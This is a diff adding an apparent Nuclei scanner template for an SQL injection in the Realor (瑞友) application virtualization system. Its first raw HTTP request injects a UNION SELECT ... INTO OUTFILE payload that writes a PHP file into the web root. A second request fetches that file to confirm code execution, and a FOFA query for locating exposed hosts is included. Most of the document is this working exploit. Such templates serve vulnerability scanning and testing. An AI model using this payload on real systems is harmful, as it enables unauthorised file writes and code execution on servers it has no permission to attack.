@@ -1,0 +1,38 @@
+id: REALOR-GWT_System-ConsoleExternalApi-sqli
+
+info:
+  name: REALOR-GWT_System-ConsoleExternalApi-sqli
+  author: linfeng7z
+  severity: high
+  description: 瑞友应用虚拟化系统 ConsoleExternalApi.XGI account SQL注入漏洞
+  metadata:
+    fofa-query: '"CASMain.XGI?cmd=GetDirApp" && title=="瑞友应用虚拟化系统"'
+  tags: sqli,sql,REALOR,GWT_System
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+      - |
+        POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1
+        Host: zhichi.realor.net:81
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Accept-Encoding: gzip
+        Content-Length: 293
+        
+        {
+          "account":"test' union select '<?php+phpinfo();?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\{{filename}}.php'#",
+          "userPwd":"123456"
+        }
+      - |
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(body_2, 'PHP Version')"
